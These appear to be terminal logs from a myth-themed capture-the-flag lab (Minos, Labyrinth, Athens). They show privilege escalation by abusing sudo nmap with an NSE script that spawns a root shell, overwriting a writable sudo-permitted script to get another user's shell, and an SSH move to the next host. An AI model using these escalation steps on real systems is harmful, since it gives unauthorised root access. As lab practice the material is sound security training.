```
minos@Minos:~$ sudo -l
Matching Defaults entries for minos on Minos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap
minos@Minos:~$ TF=$(mktemp)
minos@Minos:~$ echo 'os.execute("/bin/sh")' > $TF
minos@Minos:~$ sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org ) at 2026-01-01 00:50 UTC
NSE: Warning: Loading '/tmp/tmp.UU714afSBE' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
# /bin/sh: 2: cd: can't cd to root
# # # # # # # # 
# Crete_Shores  Minos_Flag
# Crete_Shores  Minos_Flag
# # # 
# /bin/sh: 14: cd: can't cd to cd
# # # # # 
# 
# 
# uid=0(root) gid=0(root) groups=0(root)
# root
# # uid=0(root) gid=0(root) groups=0(root)
# bin  boot  dev        etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
# # dear_mr_SUID  minotaur
# /bin/sh: 26: cd: can't cd to minotaur
# /bin/sh: 27: cd: can't cd to dear_mr_SUID
# /bin/sh: 28: LS: not found
# total 13
drwx------  5 root root   10 Aug 20  2020 .
drwxr-xr-x 22 root root   22 Aug  3  2020 ..
lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root    4 Aug  3  2020 .cache
drwx------  3 root root    3 Aug  3  2020 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root    4 Aug  3  2020 .ssh
-rw-r--r--  1 root root 2866 Aug  4  2020 dear_mr_SUID
-rw-r--r--  1 root root  912 Aug  4  2020 minotaur
# 
       -""\
    .-"  .`)     (
   j   .'_+     :[                )      .^--..
  i    -"       |l                ].    /      i
 ," .:j         `8o  _,,+.,.--,   d|   `:::;    b
 i  :'|          "88p;.  (-."_"-.oP        \.   :
 ; .  (            >,%%%   f),):8"          \:'  i
i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
<  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  <
`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
 `.   `        `o`88888888b`%%%%%88< Y888P""'-    ;
   "`---`.       Y`888888888;;.,"888b."""..::::'-'
          "-....  b`8888888:::::.`8888._::-"
             `:::. `:::::O:::::::.`%%'|
              `.      "``::::::''    .'
                `.                   <
                  +:         `:   -';
                   `:         : .::/
                    ;+_  :::. :..;;;       
                    ;;;;,;;;;;;;;,;;

# # /bin/sh: 32cat: not found
# /bin/sh: 33: CD: not found
# /bin/sh: 34: ID: not found
# dear_mr_SUID  minotaur
#                  _.                              _______
           __.--'  |             ____...,---'''''     .'''-.
       _,-'        \ ____...--'''                     | '   '-._
    ,-'             |                                 |  \      -.
 ,-'                '                                 |   '       `\
|                    \                               .'    '   _,._/
|                     \                              |      '  \
|                     \                              |       \  '
||                     \                             |        \<
|\                      \                           |          \|
|'.                     \                           /           |
| |                      \                         |            '
| '.                      |                  ____,..             \
|  |                       \__,...-----''''''       `.            |
|  '.                      \                          \           '
|   |                       \                          `           \
|   '                        \                          `           |
|    |                        \                          \          \
|    '.                       '                           \          \
|     \                        \                           \       _,|
|      |                        \                           \ _,.--  |
|      '.                        ,                       _,.-'       |
'       \                  _,.-''                 __.,-''            |
 |       |             _.-'                _,.,--'                   |
 \        \        _.-'           __,.,--''                          |
 '        `.    ,-'      __..---''                                   |
 '         \ ,-'___..,--'                                            '
  \         -'''                                                     |
   .        |                                                       ,
    |       |                                                       |
    '       |                                                       |
     \      |                                                       |
      \     |                                                       |
       \    |                                                 __,.-''
        \   |                                        __,..-''
         \  |                              ___..--'''        
          \ |                     ___,.--''
           \|        ____...,--'''
            '_..,--''

Looks like you've exploited the nmap SUID.

Here's an empty box for the effort!

Perhaps checking the network information
and using the SUID based binary to look 
for other things to use that information
on that you should have got earlier.

Perhaps reading the story as you progress 
will help you, Good luck hero!
```

```
entrance@Labyrinth:/home$ sudo -l
Matching Defaults entries for entrance on Labyrinth:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User entrance may run the following commands on Labyrinth:
    (minotaur) NOPASSWD: /home/entrance/labyrinth

minotaur@Labyrinth:/home/minotaur$ ls -ld /home/entrance
drwxr-xr-x 5 entrance entrance 13 Jan  1 02:40 /home/entrance
minotaur@Labyrinth:/home/minotaur$ ls -l /home/entrance/labyrinth
-rwxrwxr-x 1 entrance entrance 22 Jan  1 02:42 /home/entrance/labyrinth
minotaur@Labyrinth:/home/minotaur$ 

echo '#!/bin/bash' > /home/entrance/labyrinth
echo "/bin/bash" >> /home/entrance/labyrinth
echo '/bin/bash' >> /home/entrance/labyrinth

chmod +x /home/entrance/labyrinth
sudo -u minotaur /home/entrance/labyrinth

echo -e '#!/bin/bash\n/bin/bash' > /home/entrance/labyrinth
chmod +x /home/entrance/labyrinth

sudo -u minotaur /home/entrance/labyrinth
id

entrance@Labyrinth:/home$ sudo -u minotaur /home/entrance/labyrinth
minotaur@Labyrinth:/home$ id
uid=1002(minotaur) gid=1002(minotaur) groups=1002(minotaur)
minotaur@Labyrinth:/home$ ls
ariadne  entrance  minotaur
minotaur@Labyrinth:/home$ cd minotaur
minotaur@Labyrinth:/home/minotaur$ ls
Labyrinth_Flag  Minotaur  ariadne  thread
minotaur@Labyrinth:/home/minotaur$ cat Labyrinth_Flag


minotaur@Labyrinth:/home/minotaur$ sudo -l
Matching Defaults entries for minotaur on Labyrinth:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minotaur may run the following commands on Labyrinth:
    (ariadne) NOPASSWD: /home/minotaur/thread
minotaur@Labyrinth:/home/minotaur$ cd /home/minotaur/
minotaur@Labyrinth:/home/minotaur$ ls -la
total 18
drwxr-xr-x 5 minotaur minotaur   13 Aug 20  2020 .
drwxr-xr-x 5 root     root        5 Aug  3  2020 ..
lrwxrwxrwx 1 root     root        9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 minotaur minotaur  220 Aug  3  2020 .bash_logout
-rw-r--r-- 1 minotaur minotaur 3771 Aug  3  2020 .bashrc
drwx------ 3 minotaur minotaur    3 Aug  3  2020 .gnupg
drwxrwxr-x 3 minotaur minotaur    3 Aug  3  2020 .local
-rw-r--r-- 1 minotaur minotaur  807 Aug  3  2020 .profile
drwx------ 2 minotaur minotaur    5 Aug  4  2020 .ssh
-rwxr----- 1 minotaur minotaur   38 Aug  3  2020 Labyrinth_Flag
-rwxr----- 1 minotaur minotaur 1445 Aug 20  2020 Minotaur
-rwxr----- 1 ariadne  ariadne    37 Aug  4  2020 ariadne
-rwxr-xr-x 1 minotaur minotaur 8688 Aug  4  2020 thread
minotaur@Labyrinth:/home/minotaur$ file thread
thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
minotaur@Labyrinth:/home/minotaur$


```

```
Minotaur_Flag  TheReturn  ariadne  final.jpg  jpeg_body.bin  jpeg_header.bin
ariadne@Labyrinth:/home/ariadne$ ssh Shore@10.71.235.37
The authenticity of host '10.71.235.37 (10.71.235.37)' can't be established.
ECDSA key fingerprint is SHA256:LVTZvTVUM/c+/qVDbAvdKwSUcs5oCl+QCjMArUiYhAQ.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.71.235.37' (ECDSA) to the list of known hosts.
Shore@10.71.235.37's password: 

Permission denied, please try again.
Shore@10.71.235.37's password: 

Permission denied, please try again.
Shore@10.71.235.37's password: 

Shore@10.71.235.37: Permission denied (publickey,password).
ariadne@Labyrinth:/home/ariadne$ 
ariadne@Labyrinth:/home/ariadne$ cd ..
ariadne@Labyrinth:/home$ ls
ariadne  entrance  minotaur
ariadne@Labyrinth:/home$ ls -la
total 7
drwxr-xr-x  5 root     root      5 Aug  3  2020 .
drwxr-xr-x 22 root     root     22 Jul 29  2020 ..
drwxr-xr-x  4 ariadne  ariadne  14 Jan  1 03:26 ariadne
drwxr-xr-x  5 entrance entrance 13 Jan  1 02:40 entrance
drwxr-xr-x  5 minotaur minotaur 14 Jan  1 03:14 minotaur
ariadne@Labyrinth:/home$ cd ariadne
ariadne@Labyrinth:/home/ariadne$ ls -la
total 102
drwxr-xr-x 4 ariadne ariadne    14 Jan  1 03:26 .
drwxr-xr-x 5 root    root        5 Aug  3  2020 ..
lrwxrwxrwx 1 root    root        9 Aug  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ariadne ariadne   220 Aug  3  2020 .bash_logout
-rw-r--r-- 1 ariadne ariadne  3771 Aug  3  2020 .bashrc
drwx------ 3 ariadne ariadne     3 Aug  3  2020 .gnupg
-rw-r--r-- 1 ariadne ariadne   807 Aug  3  2020 .profile
drwx------ 2 ariadne ariadne     5 Aug  4  2020 .ssh
-rwxr----- 1 ariadne ariadne    38 Aug  3  2020 Minotaur_Flag
-rwxr----- 1 ariadne ariadne   689 Aug 20  2020 TheReturn
-rw-r--r-- 1 ariadne ariadne 29720 Aug 20  2020 ariadne
-rw-r--r-- 1 ariadne ariadne 29720 Jan  1 03:26 final.jpg
-rw-r--r-- 1 ariadne ariadne 29700 Jan  1 03:26 jpeg_body.bin
-rw-r--r-- 1 ariadne ariadne    20 Jan  1 03:26 jpeg_header.bin
ariadne@Labyrinth:/home/ariadne$ cd .ssh
ariadne@Labyrinth:/home/ariadne/.ssh$ ls -la
total 7
drwx------ 2 ariadne ariadne    5 Aug  4  2020 .
drwxr-xr-x 4 ariadne ariadne   14 Jan  1 03:26 ..
-rw------- 1 ariadne ariadne 1679 Aug  3  2020 id_rsa
-rw------- 1 ariadne ariadne  399 Aug  3  2020 id_rsa.pub
-rw-r--r-- 1 ariadne ariadne  444 Jan  1 03:33 known_hosts
ariadne@Labyrinth:/home/ariadne/.ssh$ cat known_hosts
|1|R88uaNRrE9cqD0Ou2KdWXzayG6E=|PBesDIm0gzmr9n3WJrGtY0Rsofg= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
|1|opaMgWGBGwKAYZhnX4pM2JMA+Ck=|bMPoqMpe3qzGgWONOmrWs09HWNI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGy/yjIbzS3kTHnzuzS7lbDjQAOpQDYw7883aFvYqH1q32nBci9bPAoJ1TwXaqhSu+B7oRChOQzlbDs9hk4SNsw=
ariadne@Labyrinth:/home/ariadne/.ssh$  ssh shore@10.71.235.37
shore@10.71.235.37's password: 
#############################################################################
#(@@@@)                    (#########)                   (@@@@@@@@(@@@@@@@@@#
#@@@@@@)___                 (####)~~~   /\                ~~(@@@@@@@(@@@@@@@#
#@@@@@@@@@@)                 ~~~~      /::~-__               ~~~(@@@@@@@@)~~#
#@@@)~~~~~~                           /::::::/\                  ~~(@@@@)   #
#~~~                              O  /::::::/::~--,                 ~~~~    #
#                                 | /:::::/::::::/{                         #
#                 |\              |/::::/::::::/:::|                        #
#                |:/~\           ||:::/:::::/::::::|                        #
#               |,/:::\          ||/'::: /::::::::::|                       #
#              |#__--~~\        |'#::,,/::::::::: __|   ,,'`,               #
#             |__# :::::\       |-#"":::::::__--~~::| ,'     ',     ,,      #
#,    ,,     |____#~~~--\,'',.  |_#____---~~:::::::::|         ',','  ',    #
# '.,'  '.,,'|::::##~~~--\    `,||#|::::::_____----~~~|         ,,,     '.''#
#____________'----###__:::\_____||#|--~~~~::::: ____--~______,,''___________#
#^^^  ^^^^^   |#######\~~~^^O, | ### __-----~~~~_____########'  ^^^^  ^^^   #
#,^^^^^','^^^^,|#########\_||\__O###~_######___###########;' ^^^^  ^^^   ^^ #
#^^/\/^^^^/\/\^^|#######################################;'/\/\/^^^/\/^^^/\/^#
#   /\/\/\/\/\  /\|####################################'      /\/\/\/\/\    #
#\/\/\     /\/\/\  /\/\/\/\    /\/\/\/\/\   /\/\/\    /\/\/\/\      /\/\/\/\#
#spb\/\/\    /\/\/\/\    /\/\/\/\    /\/\/\/\   /\/\/\/\    /\/\/\/\/\      #
#############################################################################
shore@Athens:~$ ls
Athens_flag  BlackSails
shore@Athens:~$ cat Athens_flag
 ____ ____ ____ ____ ____ ____ ____ 
||T |||h |||e |||s |||e |||u |||s ||
||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

You've survived your journey      O
and made it safely back to     ,-.|____________________
Crete, but your adventures   O==+-|(>-------- --  -     .>
have only just begun, soon     `- |"""""""d88b"""""""""
there will be many more foes     | O     d8P 88b
to face and many more heros      |  \    88= ,=88
to recount.                      |   )   9b _. 88b
                                 `._ `.   8`--'888
                                  |    \--'\   `-8___
                                  \`-.              \
                                   `. \ -       _ / <
                                     \ `---   ___/|_-\
Until next time brave hero.           |._      _. |_-|
                                      \  _     _  /.-\
                                       | -! . !- ||   |
                                       \ "| ! |" /\   |
                                        =oO)X(Oo=  \  /
                                        888888888   < \
                                       d888888888b  \_/ 
                                       88888888888

```